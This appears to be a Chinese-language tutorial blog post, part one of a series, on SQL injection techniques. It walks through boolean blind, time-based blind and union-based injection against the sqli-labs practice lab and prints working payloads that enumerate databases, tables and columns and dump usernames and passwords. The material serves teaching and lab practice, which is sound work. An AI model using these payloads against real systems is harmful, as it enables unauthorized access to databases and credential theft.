# 常见sql注入手法总结与技巧(一)

## 前言

SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。

sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。

**根本产生原因：**后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询

所以在学习SQL注入前需要了解SQL基础语法



## SQL注入根源分析

如果后台sql语句为：

```sql
$sql="SELECT * FROM users WHERE id=' $id ' LIMIT 0,1";
```

如果我们传入id=1'  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：

```sql
$sql="SELECT * FROM users WHERE id='1'' LIMIT 0,1";
```

我们传入的 ' 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1'后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。

```sql 
id = -1' union select database() #
$sql="SELECT * FROM users WHERE id='-1' union select database() #' LIMIT 0,1";
```

-1表示查询一个不存在的id，是为了不影响后面我们的注入语句

#,--+,-- 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句

## sql参数类型分类

SQL注入按照参数类型分类可分为两种：数字型和字符型

1. 数字型：select * from table where id=2
2. 字符型：select * from table where id='2'

区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。

判断类型方法：

​	构造payload为：`id=1 order by 9999 --+`

如果正确返回页面，则为字符型；否则，为数字型

​	构造payload为：`1 and 1=2`

如果正确返回页面，则为字符型；否则，为数字型

## 常见sql注入手法

这里先给出常用的payload，后面会使用到

```sql
select database()

select group_concat(table_name)from information_schema.tables where table_schema=database()

select group_concat(column_name)from information_schema.columns where table_name='xxxx'

select group_concat(字段名) from 表名
```

### 常见注入手法分类

布尔盲注

时间盲注

union联合注入

报错注入

堆叠注入

二次注入

宽字节注入

通过sql注入写webshell

通过http header注入



### 盲注

通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。

我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。

盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：

```
如果"数据库XX"的第一个字母是a，就返回“查询成功”，否则返回“查询失败”
如果"数据库XX"的第一个字母是b，就返回“查询成功”，否则返回“查询失败”
如果"数据库XX"的第一个字母是c，就返回“查询成功”，否则返回“查询失败”
...
如果"数据库XX"的第二个字母是a，就返回“查询成功”，否则返回“查询失败”
如果"数据库XX"的第二个字母是b，就返回“查询成功”，否则返回“查询失败”
如果"数据库XX"的第二个字母是c，就返回“查询成功”，否则返回“查询失败”
...
```

通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。

#### 布尔盲注

下面使用sqli-labs靶场演示,less-8关

查询成功返回You are in....

![image-20221122162615723](https://static.sechelper.com/img/2023/01/19/0958b02f5e514589e2bb28f639ab99f2.png)

而查询失败则什么都不显示

![image-20230119183034147](https://static.sechelper.com/img/2023/01/19/2279a07b9b1d08146065912fd1765624.png)

返回You are in....相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in....来充当判断条件。

**要使用的sql函数：**

substr(要截取的字符串，从哪一位开始截取，截取多长)

ascii()返回传入字符串的首字母的ASCII码

**获取当前数据库名**

```
1.判断当前数据库名的长度
id=1' and length(database())=8 --+  //有回显
判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符

2.判断当前数据库名
//判断数据库的第一个字符
id=1' and ascii(substr(database(),1,1))=115 --+
//判断数据库的第二个字符
id=1' and ascii(substr(database(),2,1))=101 --+
//判断数据库的第三个字符
id=1' and ascii(substr(database(),3,1))=99 --+
...

数据库为 security
```

**获取当前库的表名**

```
判断每个表名的每个字符的ascii值
//判断第一个表的第一个字符
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+

//判断第一个表的第二个字符
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+
...

判断出存在表 emails、referers、uagents、users 
```

**获取表的字段**

```
猜测users表比较重要，先查询users表
//判断第一个字段的第一个字符
id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117 --+

//判断第一个字段的第二个字符
id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))=115 --+
...

users表中存在 id、username、password 字段
```

**获取字段中的数据**

```
//判断id字段的第一行数据的第一个字符
id=1' and ascii(substr((select id from users limit  0,1),1,1))=100 --+
//判断id字段的第二行数据的第二个字符
id=1' and ascii(substr((select id from users limit 0,1),2,1))=100 --+
...
```

手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑

#### 时间盲注

时间盲注也叫**延迟注入**。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。

以Less-9为例，当我们以id=1' and sleep(5) --+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。

if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。

**获取数据库名**

```
//查询数据库名第一个字符
id=1' and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+
明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。
//查询数据库名第二个字符
id=1' and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+
...
```

与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。

不建议手注，建议编写脚本或使用工具



### union联合注入

**第一步**，测试注入点，一些小技巧：利用引号，and 1=1 ，or 1=1 等判断是字符型还是数字型

![image-20221122155607252](https://static.sechelper.com/img/2023/01/19/ae02739b6af1ed277bb0a55d5fb2f869.png)

正常返回判断是字符型



**第二步**，利用order by 查表得到到字段个数

![image-20221122160356671](https://static.sechelper.com/img/2023/01/19/07895e1931e169a079743920de16141d.png)

![image-20221122160410458](C:\Users\dong\Desktop\Books\sql注入\sql注入\image-20221122160410458.png)

查到3时正常返回但到4时报错说明当前表中只有三列



**第三步**，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置

![image-20221122160538292](https://static.sechelper.com/img/2023/01/19/ea34318fc35954a76f6dd6eddb47871b.png)

发现者里有2和3的回显位,在name和Password回显



**第四步**，爆库，爆表，爆字段名，爆值

为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表

组合使用上面提到的常用的payload，放在页面回显位上

`-1' union select 1,(select database()),3 --+`

![image-20221122160735322](https://static.sechelper.com/img/2023/01/19/1c659169b7b337f79bcc27ccae71facc.png)

`-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+`

![image-20221122160835475](https://static.sechelper.com/img/2023/01/19/454173750e095714af6d3f0d97e76bf8.png)

爆出4个表，选择爆users表

`-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='users'),3 --+`

![image-20221122161319576](https://static.sechelper.com/img/2023/01/19/6eac18f2cab4f638652ec536cb5398b8.png)

发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表

`-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),3 --+`

![image-20221122161750737](https://static.sechelper.com/img/2023/01/19/18c1696be03eaf0446ad95c15a161933.png)

爆字段的数据

`-1' union select 1,(select group_concat(id,username,password) from users),3 --+`

![image-20221122161942467](https://static.sechelper.com/img/2023/01/19/181a4b3cf49119b536084c0db16eaed7.png)

```sql
-1' union select 1,(select database()),3 --+
-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+
-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='users'),3 --+
-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),3 --+
-1' union select 1,(select group_concat(id,username,password) from users),3 --+
```
